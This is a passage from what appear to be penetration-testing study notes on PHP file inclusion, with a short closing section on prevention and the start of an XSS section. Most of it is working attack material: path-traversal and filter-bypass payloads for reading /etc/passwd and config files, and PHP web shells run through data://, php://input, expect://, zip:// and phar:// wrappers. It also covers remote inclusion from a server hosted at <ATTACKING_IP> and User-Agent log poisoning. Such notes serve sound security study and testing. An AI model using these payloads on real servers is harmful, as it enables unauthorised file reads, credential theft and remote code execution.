* This can be done to go back several directories until reaching the root path (i.e., `/`), and then specifying an absolute file path (i.e., `../../../../etc/passwd`), and the file should exist. 
   * This would even work if the entire parameter was used in the `include()` function, so this technique can be used from the beginning. If a user is not sure of the directory the web application is in, `../` can be added many times without breaking the path. However, it can always be useful and efficient to not add `../` several times, especially when writing a report or writing an exploit. 
   
<br>

**<u>Filename Prefix</u>**

On some occasions, the input may be appended after a different string. For example, it may be used with a prefix to get the full filname, like the following example:
```php
include("lang_" . $_GET['language']);
```
* In this case, if trying to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid. 

Instead of directly using path traversal, `/` can be prefixed before the payload, which would consider the prefix as a directory. Doing so would allow a hacker to bypass the filename and traverse directories:
```bash
index.php?language=/../../../etc/passwd
```

> This may not always work. Also, any prefix appended to the input may break some file inclusion techniques, like PHP wrappers and filters or RFI

<br>

**<u>Appended Extensions</u>**

Another example is when an extension is appended to the language parameter:
```php
include($_GET['language'] . ".php");
```

This is common in many web applications. This may also be safer as it may restrict users to only including PHP files. In this case, if trying to read /etc/passwd, then the file included would be /etc/passwd.php, which does not exist. Other methods may be able to bypass this, however. 

<br>

**<u>Second-Order Attacks</u>**

Second Order attacks are a more advanced LFI attack. This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters. 

For example, a web application may allow users to download an avatar through a URL like (/profile/$username/avatar.png). If trying to craft a malicious LFI username, like `../../../etc/passwd`, then it may be possible to change the file being pulled to another local file on the server and grab it instead of an avatar.
* This is technically poisoning a database entry with a malicious LFI payload in the username. Then, another web application functionality would utilize this poisoned entry to perform the attack (i.e. download our avatar based on username value).

These vulnerabilities are often overlooked, as they may protect against direct user input, but they may trust values from their database. If it is possible to poison a username during registration, then this attack would be possible. 
* Performing this attack requires spotting a function that pulls a file based on a value that can be indirectly controlled, and then trying to control that value to exploit the vulnerability

<a id="basicbypassesfiledisc"></a>

#### **`Basic Bypasses`**

**<u>Non-Recursive Path Traversal Filters</u>**

One of the most basic filters against LFI is a search and replace filter, where it deletes substrings of (../) to avoid path traversals. For example:
```php
$language = str_replace('../', '', $_GET['language']);
```

This filter is quite insecure, as it is not recursively removing the ../ substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if `....//` is used as a payload, then the filter would remove the ../ and the output string would be ../, which means that path traversal can still be performed:
```bash
index.php?language=....//....//....//....//etc/passwd
```

The `....//` is not the only bypass that can be used. `..././` or `....\/`, and several other recursive LFI payloads can be used (found on Payload All the Things in GitHub). Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (`....\/`) or adding extra forward slashes (`....////`).

<br>

**<u>Encoding</u>**

Some web filters may prevent input filters that include certain LFI-related characters, like a dot or a slash used for path traversals. Some of these filters can be bypassed by **URL encoding** user input, such that it would no longer include these bad characters, but would still be decoded back to the path traversal string once it reaches the vulnerable function.
* Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions, there may be custom filters that may be bypassed through URL encoding. 

If the target web application does not allow `.` and `/` in the input, `../` can be URL encoded into `%2e%2e%2f`, which may bypass the filter. To do so, any online URL encoder utility can be used to create a string with the /etc/passwd file:
```bash
index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

The string can be encoded twice to have a **`Double Encoded String`,** which may also bypass other types of filters. Blacklisted characters can be bypassed by using several command injection techniques.

<br>

**<u>Approved Paths</u>**

Some web applications may use **`Regex`** to ensure that the file being included is under a specific path. For example, this web application may only accept paths that are under the ./languages directory:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

To find the approved path, requests sent by the existing forms can be examined, and see what path they use for the normal web functionality. 
* Directories can be fuzzed under the same path, trying different ones until one matches. To bypass this, **path traversal can be used, starting the payload with the approved path and then using ../ to go back to the root directory and read the specified file:** 
```bash
index.php?language=./languages/../../../../etc/passwd
```

Some web applications may apply this filter along with the previously mentioned filters, so these techniques can be combined, starting the payload with the approved path, and then URL encoding the payload or using a recursive payload.


> All techniques mentioned so far should work with any LFI vulnerability, regardless of the back-end development language or framework


<br>

**<u>Appended Extension</u>**

Again, some web applications append an extension to the input string (i.e., .php) to ensure that the included file is in the expected extension. With modern versions of PHP, there may be no bypass to read specific files on the system, but may be useful to read files with that extension for reading source code. 

Techniques to bypass appended extension filters are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4. This is why it is important to enumerate properly, determining the server architecture.

<br>

**<u>Path Truncation</u>**

In earlier versions of PHP, defined strings have a maximum length of 4096 characters. If a longer string is passed, it will be truncated, and any characters after the maximum length will be ignored. 
* PHP also used to remove trailing slashes and single dots in path names, so if /etc/passwd/. is called, then the /. would also be truncated, and PHO would call /etc/passwd. 

* PHP, and Linux systems in general, also disregard multiple slashes in the path. Also, a current directory shortcut (.) in the middle of the path would also be disregarded
   * ////etc/passwd is the same as /etc/passwd
   * /etc/./passwd is the same as /etc/passwd

If both of these PHP limitations are combined, a long string can be created to evaluate to a correct path. Whenever the 4096 character limitation is reached, the appended extension (.php) would be truncated, and the path without the appended extension would be reached. It is important to note that this requires a non-existing directory to be the start of the path for this to work
```ash
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Instead of manually typing ./ 2048 times, this can be automated:
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; 
```

<br>

**<u>Null Bytes</u>**

PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a **null byte (`%00`)** at the end of the string would terminate the string and not consider anything after it.
* This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of a string, like in Assembly, C, or C++

To exploit this vulnerability, the payload can be ended with a null byte (etc/passwd%00), such that the final path passed to `include()` would be etc/passwd%00.php. This way, even though .php is appended to the string, anything after the null byte would be truncated.

<a id="phpfiltersfiledisc"></a>

#### **`PHP Filters`**

**`PHP Wrappers`** allow hackers to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. These wrappers can be used to extend exploitation attacks, read PHP source code files, or even execute system commands. 

**<u>Input Filters</u>**

PHP filters are a type of PHP wrapper, where different types of input can be passed and have it filtered by the specified filter. To use **PHP wrapper streams, the `php://`** scheme can be used in the string, and the **PHP filter wrapper can be accessed with `php://filter/`**

The filter wrapper has several parameters, but the main ones for attacks are: * **`resource`:** Required for filter wrappers. With it, the stream that is to be applied the filter on (i.e., a local file) can be specified

* **`read`:** Can apply different filters on the input resource, so it can be used to specify which filter is to be applied on the resource

There are four different types of filters available for use, which are `String Filters`, `Conversion Filters`, `Compression Filters`, and `Encryption Filters`.
* The most useful for LFI attacks is the **`convert.base64-encode filter`,** which is a Conversion Filter.

<br>

**<u>Fuzzing for PHP Files</u>**

First, the different available PHP pages need to be fuzzed with ffuf or gobuster:
```bash
ffuf -w /seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

> Scan for all codes, including 200, 301, 302, and 403 pages. Read their source codes. 

Even after reading the sources of any identified files, scan them for other referenced PHP files and read those too until gathering most of the web application's source or having an accurate image of what it does. It is also possible to start by reading `index.php` and scanning it for more references and so on, but fuzzing for PHP files may reveal files that may not otherwise be found that way.  

<br>

**<u>Standard PHP Inclusion</u>**

Again, if trying to include any php files through LFI, the included PHP file gets executed and eventually rendered as a normal HTML page. 
* For example, the following includes the config.php page (the .php extension is appended by the web application):
```bash
index.php?language=config
```

An empty result will be in place of the LFI string, since the config.php most likely only sets up the web app configuration and does not render any HTML output. 
* This may be useful in certain cases, like accessing local PHP pages that are not accessible (SSRF), but in most cases, it is better to read the PHP source code through LFI
  * Source codes tend to reveal important information about the web app. 

The **`base64 php filter`** is useful in this case, as base64 can be used to encode the php file, then the encoded source code would be produced instead of it being executed and rendered. This is especially useful for cases dealing with LFI with appended PHP extensions, because the hacker may be limited in only including PHP files. 

<br>

**<u>Source Code Disclosure</u>**

Once a list is gathered for potential PHP files that are to be read, their sources can be disclosed with the base64 php filter. The following example attempts to read the source code of config.php using the base64 filter by specifying **`convert.base64-encode`** for the read parameter and config for the resource parameter:
```php
php://filter/read=convert.base64-encode/resource=config

/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

> The resource file is intentionally left at the end of the string, as the .php extension is automatically appended to the end of the input string, making the specified resource config.php

Using the base64 filter returns an encoded string instead of an empty result. This string can be decoded to get the source code of config.php, as follows:
```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

Now, this file can be investigated for sensitive information like credentials or database keys. Also, look for more references and then disclose their sources.

<a id="phpwrappersrce"></a>

#### **`PHP Wrappers (RCE)`**

**<u>Data</u>**

The **`Date Wrapper`** can be used to include external data, including PHP code. However, **the data wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configuration**; therefore, first confirm whether this setting is enabled by reading the PHP configuration file through the LFI vulnerability

**<u>Checking PHP Configurations</u>**

The PHP configuration file can be found in the following directories (X.Y is the install PHP version):
* **Apache:** /etc/php/X.Y/apache2/php.ini

* **Nginx:** /etc/php/X.Y/fpm/php.ini

> Start with the latest PHP version, and then try earlier versions if the configuration file is unable to be located. 

The base64 filter should be used, as .ini files are similar to .php files and must be encoded to avoid breaking. Finally, use `cURL` or Burp instead of a browser, as the output string could be very long and should be captured properly:
```bash
curl "http://<SERVER_IP>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Once the base64 encoded string is obtained, decode it and grep for `allow_url_include` to see its value:
```bash
 echo '<string>' | base64 -d | grep allow_url_include
 ```

See if this option is enabled; if so, the data wrapper can be used. This option is not enabled by default, and is required for several other LFI attacks, like using the input wrapper or for any RFI attack. 
* It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example. 

<br>

**<u>Remote Code Execution</u>**

With `allow_url_include` enabled, a data wrapper attack can be performed. `base64` encoded strings can be passed with `text/plain;base64`, and it has the ability to decode them and execute the PHP code. The first step would be to base64 encode a basic PHP shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
> PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

After this, the base64 string can be URL encoded, and then passed through the data wrapper with `data://text/plain;base64,`. Now, commands can be passed through the web shell with `&cmd=<COMMAND>`
```bash
language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

cURL can be used for the same attack:
```bash
curl -s 'http://<SERVER_IP>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

<br>

**<u>Input</u>**

Similar to the data wrapper, the **`Input Wrapper`** can be used to include external input and execute PHP code; however, the input wrapper allows an attacker to pass their input to the input wrapper as a POST request's data. So, this vulnerable parameter must accept POST request for this attack to work. Finally, the input wrapper also depends on the `allow_url_include` setting. 

To perform this attack, a POST request can be sent to the vulnerable URL and a web shell can be added as POST data. To execute a command, an attacker would pass it as a GET parameter, like in the previous attack:
```bash
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:/index.php?language=php://input&cmd=id" | grep uid
```

> To pass the command as a GET request, the vulnerable function needs to accept GET request (i.e., use $_REQUEST). If it only accepts POST requests, then the command can be put directly in the PHP code, instead of a dynamic web shell (i.e., <\?php system('id')?>)

<br>

**<u>Expect</u>**

The **`Expect Wrapper`** allows attackers to directly run commands through URL streams. Expect works similar to the previous web shells, but it doesn't need to provide a web shell because it is designed to execute commands. 

Expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so it may be encountered in specific cases. To determine whether it is installed on the back-end server, the same can be done as with allow_url_include, but grep for expect instead:
```bash
echo '<string>' | base64 -d | grep expect
```
* If enabled, `extension=expect` would appear in the output. 


The expect module can be used to gain RCE through the LFI vulnerability. To use the expect module, the `expect://` wrapper can be used to pass a command that is to be executed:
```bash
curl -s "http://<SERVER_IP>/index.php?language=expect://id"
```

<a id="rfirce"></a>

#### **`Remote File Inclusion (RCE)`**

If the vulnerable function allows the inclusion of remote URLs, this allows two main benefits:
1. Enumerating local-only ports and web applications (i.e., SSRF)

2. Gaining RCE by including a malicious script that is hosted from the attacking machine. 



**<u>Local vs. Remote File Inclusion</u>**

When a vulnerable function allows attackers to include remote files, they may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain RCE. 

Almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones; however, an LFI may not necessarily be an RFI for the follwing three reasons:
1. The vulnerable function may not allow including remote URLs

2. Attackers may only control a portion of the filename and not the entire protocol wrapper (i.e., http://, ftp://, https://)

3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default. 

> Some functions allow including remote URLs but do not allow code execution. In this case, attackers would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF

<br>

**<u>Verify RFI</u>**

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow_url_include setting to be enabled, as seen in the *PHP Wrappers (RCE)* section.
* This may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with

A more reliable way to determine whether an LFI vulnerability is also vulnerale to RFI is to try and include a URL, and see if content can be gathered. At first, try to include a local URL to ensure that the attempt does not get blocked by a firewall or other security measures. The following example uses the local host as the input string to see if it gets included:
```bash
index.php?language=http://127.0.0.1:80/index.php
```

If this is vulnerable to RFI, the index.php, in this case, will be included in the vulnerable section. If so, it is possible to include URLs. Furthermore, if the page executes and renders as PHP and not included as source code text, the vulnerable function will also allow PHP execution, which may allow attackers to execute code if a malicious PHP is included from the hosted machine.

> It may not be ideal to include the vulnerable page itself (i.e., index.php), as this may cause a **recursive inclusion loop and cause a DoS** to the back-end server

<br>

**<u>Remote Code Execution with RFI</u>**

The first step in gaining RCE is creating a malicious script in the language of the web application, PHP in this case. A custom web shell can be downloaded from the internet, a reverse shell script can be used, or a basic web shell can be written:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, this script needs to be hosted on the attacking machine and included through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, the script can be hosted through an FTP or SMB service

<br>

**<u>HTTP</u>**

Start a server on the attacking machine with a basic python server. Of course, the malicious script should be in the same directory as the directory being hosted, to make the RFI easier:
```bash
sudo python3 -m http.server <PORT>
```

Now, include the local shell through RFI, but using the attacker's IP and listening port. Also, specify the command to be executed with `&cmd=<COMMAND>:`
```bash
http://<SERVER_IP>/index.php?language=http://<ATTACKING_IP>:<PORT>/shell.php&cmd=id
```
* If successful, the server will connect to the python server, the remote shell will be included, and the specified command will be executed

* Examine the connection to the attacking machine to ensure the request is being sent as specified. If an extra extension, like .php, was appended to the request, then omit it from the payload


**<u>FTP</u>**

If the script is hosted through FTP, a basic FTP server can be started with `Python's pyftpdlib`:
```bash
sudo python -m pyftpdlib -p 21
```
* This may be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF. 


To include the malicious script, the `ftp://` scheme can be used in the URL:
```bash
http://<SERVER_IP>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

By default, PHP tries to authenticate as an anonymous user. If the server requires balid authentication, then the credentials can be specified in the URL, as follows:
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

**<u>SMB</u>**

If the vulnerable web application is hosted on a Windows server (determined from the server version in the HTTP response headers), then the attacker does not need the `allow_url_include` setting to be enabled for RFI exploitation, as the SMB protocol can be used for the RFI. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path. 

An SMB server can be created via `Impacket's smbserver.py`, which allows anonymous authentication by default:
```bash
impacket-smbserver -smb2support share $(pwd)
```

Once configured, the script can be included via an UNC path (i.e., \\<ATTACKERS_IP>\share\shell.php), and specify the command with &cmd=<COMMAND>:
```bash
http://<SERVER_IP>/index.php?language=\\<ATTACKERS_IP>\share\shell.php&cmd=whoami
```

This attack works in including the remote script without enabling any non-default settings; however, this technique is more likely to work if on the same network as the target server, as accessing remote SMB servers over the internet may be disabled by default depending on the Windows server configurations.

<a id="lfiandfileuploadsrce"></a>

#### **`LFI and File Uploads (RCE)`**

For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability

While there are several different techniques on how to exploit file upload forms and functionalities, for LFI, the only thing needed is to upload files. If the vulnerable function has code execute capabilities, then the code within the uploaded file will get executed everytime it is included, regardless of the file extension or file type. 
* For example, an image file (image.jpg) can be uploaded with a stored PHP web shell code within it instead of image data. If included through an LFI vulnerability, the PHP code will get executed and RCE will be achieved. 

<br>


**<u>Image Upload</u>**

**Image Upload** is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. The vulnerability, in this case, is not in the file upload form, but the file inclusion functionality

The first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. Use an **allowed image extension** in the file name (i.e., shell.gif) and include the image magic bytes at the beginning of the file content (i.e., GIF8), just in case the upload form checks for both the extension and content type:
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

While this file on its own is completely harmless and would not affect normal web applications in the slightest, if combined with an LFI vulnerability, then achieving RCE may be possible:

> A GIF image is used in this example since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that would need to be URL encoded. However, this attack would work with any allowed image or file type 

At this point, the attacker should attempt to upload the malicious image. Continue to the next part if successfully uploaded.

<br>

**<u>Uploaded File Path</u>**

If the file uploads to the server, it should now be included through the LFI vulnerability. **To include the uploaded file, the path to it must be known.** In most cases, especially with images, one would get access to the uploaded file and can get its path from its URL. Sometimes, **inspecting the source code after uploading the image will provide the proper path.**
* If this does not work, fuzz for an uploads directory and then fuzz for the uploaded file. This may not always work as some web applications properly hide the uploaded files

After discovering the uploaded file path, include the uploaded file in the LFI vulnerable function, executing the PHP code:
```bash
http://<SERVER_IP>/index.php?language=./profile_images/shell.gif&cmd=id
```

<br>

**<u>Zip Upload</u>**

There are a couple of PHP-only techniques that use PHP wrappers to achieve RCE.

The `ZIP wrapper` can be used to execute PHP code; however, this wrapper isn't enabled by default, so this method may not always work. To do so, a PHP web shell can be created and zipped into a zip archive (shell.jpg):
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

> Even though the zip archive is named shell.jpg, some upload forms may still detect the file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed

Once the shell.jpg archive is uploaded, it can be included with the zip wrapper as `zip://shell.jpg`, and then refer to any files within it with `#shell.php` (URL encoded). Commands can be executed with `&cmd=<COMMAND>`:
```bash
http://<SERVER_IP>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

<br>

**<u>Phar Upload</u>**

The `phar://` wrapper can be used to achieve a similar result to that of the ZIP wrapper. To do so, write the PHP script into a shell.php file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt subfile, which can be interacted with. This can be compiled into a phar file and renamed to shell.jpg:
```bash
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

At this point, there should be a phar file called shell.jpg. Once it is uploaded to the web application, it can be called with `phar://` and provide its URL path, and then the phar sub-file can be specified with `/shell.txt` (URL encoded) to get the output of the specified command with &cmd=<COMMAND>:
```bash
http://<SERVER_IP>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

#### **`Log Poisoning (RCE)`**

If any file that containts PHP code is included, it will get executed as long as the vulnerable function has the Execute privileges. **The following attacks all rely on the same concept: writing PHP code in a controllable field that gets logged into a log file, and then include that log file to execute the PHP code.** For this attack to work, the PHP web application should have read priviliges over the logged files, which vary from one server to another. 

<br>

**<u>PHP Session Poisoning</u>**

Most PHP web application use **`PHPSESSID`** cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. 
* These details are stored in session files on the back-end, and saved in **`/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows.** 

* The name of the file that contains a user's data matches the name of the PHPSESSID cookie with the `sess_` prefix
   * For example, if the PHPSESSID cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`

The first thing that needs to be done in a PHP Session Poisoning attack is to examine the PHPSESSID session file and see if it contains any data that can be controlled and poisoned. So, **first check if the PHPSESSID cookie is set to the session.** `Inspect the page to determine this`


If there is PHPSESSID cookie value, it would be stored in the aforementioned directory. Try to include this session file through the LFI vulnerability and view its contents:
```bash
http://<SERVER_IP>:/index.php?language=/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
```

> The cookie value will differ from one session to another, so the attacker needs to use the cookie value found in their own session to perform the attack 

The session file should contain two values:
1. **Page:** Shows the selected page. The page value is under the users control, and in this case, can be controlled through the `?language=parameter`

2. **Preference:** Shows the selected language. This value is not under the users control, as it cannot be specified anywhere, so it must be automatically specified

<br>

**1. Try setting the value of page a custom value via the parameter,** and see if it changes in the session file. This can be done by visting the page as follows:
```bash
http://<SERVER_IP>/index.php?language=session_poisoning
```

**2. Now, include the session file again to look at its contents:**
```bash
http://<SERVER_IP>:/index.php?language=/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
```
* At this point, the session file should contain session_poisoning instead of the .php file, confirming the ability to control the value of page in the session file. 


**3. The next step is to perform the poisoning step by writing PHP code to the session file.** A basic PHP web shell can be written by changing the ?language=
parameter to a URL encoded web shell:
```bash
http://<SERVER_IP>:/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**4. Finally, the session file can be included,** using `&cmd=<COMMAND>` to execute commands:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3&cmd=id
```

> To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten after the last inclusion. Ideally, the poisoned web shell would be used to write a permanent web shell to the web directory, or send a reverse shell for easier interaction

<br><br>

**<u>Server Log Poisoning</u>**

Both Apache and Nginx maintain various log files, such as **access.log** and **error.log** The access.log file contains a lot information about all requests made to the server, including each request's `User-Agent header`. As the User-Agent header can be controlled in requests, it can be used to poison the server logs as well

Once poisoned, the logs can be included through the LFI vulnerability, and for that, there needs to be read-access over the logs. Nginx logs are readable by low privileged users by default, while the Apache logs are only readable by users with high privileges; however, in older or misconfigured Apache servers, these logs may be readable by low-privileged users. By default:
* **`Apache Logs`** are located in **/var/log/apache2/** on **Linux** and in **C:\xampp\apache\logs\\** on **Windows**

* **`Nginx Logs`** are located in **/var/log/nginx/** on **Linux** and in **C:\nginx\log\\** on **Windows**

* In some cases, these logs may be in different locations, so an LFI wordlist can be used to fuzz for their locations. 

<br>

The following attempts to include the Apache access log from **`/var/log/apache2/access.log`**:
```bash
http://<SERVER_IP>/index.php?language=/var/log/apache2/access.log
```
* If this works, the log will be outputted to the HTML page. The log contains the remote IP address, request page, response code, and the User-Agent header
   * The User-Agent header is controlled by the end user through the HTTP request headers, so this value should be poisonable

> Loading logs through an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. Be careful and efficient with them in a production environment and don't send unnecessary requests. 

Modifying the User-Agent header can be done through Burp

**1.** Intecept the LFI request

**2.** Modify the User-Agent header to Apache Log Poisoning
```html
User-Agent: Apache Log Poisoning
```

**3.** Send the request 

**4.** The custom User-Agent value should be visible in the included log file. Now, poison the User-Agent header by seetting it to a basic PHP shell
```html
User-Agent: <?php system($_GET['cmd']); ?>
```

* The log can also be poisoned by sending a request through cURL:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

At this point, the log should now contain PHP code, the LFI vulnerability should execute this code, allowing RCE. A command can be executed with `cmd?<COMMAND>`:
```html
GET /index.php?language=var/log/apache2/access.log&cmd=id HTTP/1.1
HOST: x.x.x.x
....
```

> The User-Agent header is also shown on process files under the Linux `/proc/` directory. So, try including the `/proc/self/environ` or `/proc/self/fd/N` files, where N is a PID usually between 0-50. This is especially useful when there is no read access over the server logs, however, these files may only be readable by privileged users

<a id="fiprevention"></a>

#### **`File Inclusion Prevention`**

The most effective thing that can be done to reduce file inclusion vulnerabilities is to **avoid passing any user-controlled inputs into any file inclusion functions or APIs.** The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever. If this is not possible, then there should be a **limited whitelist of allowed user inputs,** and match each input to the file to be loaded while having a default value for all other inputs. If dealing with an existing web application, create a whitelist that contains all existing paths used in the front-end, and then use the list to match the user input. 
* Such a whitelist can have many shapes, like a database table that matched IDs to files, a case-match script that matches names to files, or even a static JSON map with names and files that can be matched. 
    * Once this is implemented, the user input is not going into the function, but the matched files are used in the function, which avoids file inclusion vulnerabilities

<br>

**<u>Preventing Directory Traversal</u>**

If attackers can control the directory, they can escape the web app and attack something they are more familiar with or use a universal attack chain. Directory traversal could potentially allow attackers to do any of the following:
* Read /etc/passwd and potentially find SSH keys or know valid user names for a password spray attack

* Find other services on the machine
    * Such as Tomcat; read the tomcat-users.xml file

* Discover valid PHP Session Cookies and perform session hijacking

* Read current web application configuration and source code

The best way to prevent directory traversal is to use the programming language's (or framework's) built-in tool to pull only the filename. For example, **PHP has `basename()`,** which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final `/` as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it. 

Besides this, the **user input can be sanitized to recursively remove any attempts** of traversing directories:
```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

<br>

**<u>Web Server Configuration</u>**

Several configurations may also be used to reduce the impact of file inclusion vulnerabilities in case they occur. For example, the inclusion of remote files should be globally disabled. In PHP this can be done by setting **`allow_url_fopen` and `allow_url_include` to Off**

It's also often possible to lock web apps to their web root directory, preventing them from accessing non-web related files. The most common way to do this in modern times is by running the application within **`Docker`;** however, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP, this can be done by adding **`open_basedir = /var/www` in the php.ini file.** Furthermore, a web designer should ensure that any potentially dangerous modules are disabled, like **`PHP Expect mod_userdir.`**
* If these configurations are applied, it should prevent accessing files outside the web application folder, so even if an LFI vulnerability is identified, its impact would be reduced. 

<br>

**<u>Web Application Firewall (WAF)</u>**

The universal way to harden applications is to use a WAF, like ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to *blocking mode*, having it in permissive mode can be a warning sign that the application is being attacked. 

Finally, it is important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. 

<a id="xss"></a>

### **`Cross-Site Scripting`**

XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JS code to the page and execute it on the client side, leading to several types of attacks. When a vulnerable web app does not properly sanitize user input, a malicious user can inject extra JS code in an input field, so once another user views the same page, they unknowingly execute the malicious JS code. 
* XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user execuring the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are commonly found in web applications, so this equates to a medium risk.

XSS vulnerabilities can facilitate a wide range of attacks, which can be anything that can be executed through browser JS code. A basic example of an XSS attack is having the target user unwittingly send their session cookie to the attacker's web server. Another example is having the target's browser execute API calls that lead to a malicious action, like changing the user's password to a password of the attacker's choosing. 

As XSS attacks execute JS code within the browser, they are limited to the browser's JS engine. They cannot execute system-wide JS code to do something like system-level code execution. In modern browsers, they are also limited to the same domain of the vulnerale website. Nevertheless, being able to execute JS in a user's browser may still lead to a wide variety of attacks. In addition to this, if a researcher identifies a binary vulnerability in a web browser, they can use an XSS vulnerability to execute a JS exploit on the target's browser, which eventually breaks out the browser's sandbox and executes code on the user's machine

There are three main types of XSS vulnerabilities:
1. **`Stored (Persistent) XSS`:** The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval. Other users can be targeted with this XSS type

2. **`Reflected (Non-Persistent) XSS`:** Occurs when user input is displayed on the page after being processed by the back-end server, but without being stored. In this case, the injected script comes from the HTTP response, where the script is included. The user can pretty much only target themself

3. **`DOM-based XSS`:** Another non-persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (i.e., through client-side HTTP parameters or anchor tags). 

<a id="storedxss"></a>

#### **`Stored XSS`**

If the XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that the XSS attack is persistent and may affect any user that visits the page. Stored XSS attacks may not be easily removable, and the payload may need removing from the back-end database. 

Determine whether user input is displayed on the page. If no sanitization or filtering was applied to the input, the page might be vulnerable to XSS. Begin by testing the page to determine whether it is vulnerable to XSS with the folliwng basic payload:
```js
<script>alert(window.origin)</script>
```
* If the page allows any input and does not perform any sanitization on it, the alert should pop up with the URL of the page it is being executed on everytime the payload is input or when the page is refreshed. 
   * Confirm this by inspecting the page source; the payload should be directly included there

